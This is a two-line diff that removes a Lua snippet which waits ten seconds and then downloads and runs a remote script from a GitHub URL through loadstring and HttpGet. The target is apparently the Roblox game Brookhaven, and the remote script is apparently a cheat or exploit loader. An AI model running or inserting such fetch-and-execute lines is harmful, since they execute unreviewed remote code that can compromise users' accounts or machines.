@@ -1,2 +1,0 @@
-wait(10)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/speedwavevip/Speed_Aya/refs/heads/main/Brookhaven%20lraq"))()
